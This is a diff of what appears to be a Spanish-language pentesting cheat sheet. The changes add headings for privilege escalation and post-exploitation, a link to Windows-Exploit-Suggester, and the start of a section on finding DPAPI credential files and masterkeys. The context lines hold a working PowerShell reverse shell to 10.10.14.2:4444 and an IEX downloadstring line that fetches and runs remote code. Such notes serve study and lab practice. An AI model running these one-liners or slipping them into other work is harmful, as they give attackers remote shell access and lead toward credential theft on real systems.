@@ -484,8 +484,12 @@ START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
+## [](#header-2)<a id="Privilege_escalation">Privilege escalation</a>
+Podemos usar una tool que nos sugiere como explotar un cve para la escalada d elos privilegios
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 
-Post priv escalation
+## [](#header-2)<a id="Post_priv_escalation">Post priv escalation</a>
+
 
 Las credential filenames tienen una cadena de 32 caracteres como por ejemplo: "85E671988F9A2D1981A4B6791F9A4EE8" y las masterkeys son un GUID como "cc6eb538-28f1-4ab4-adf2-f5594e88f0b2", para encontrarlas tenemos el comando:
 ```shell
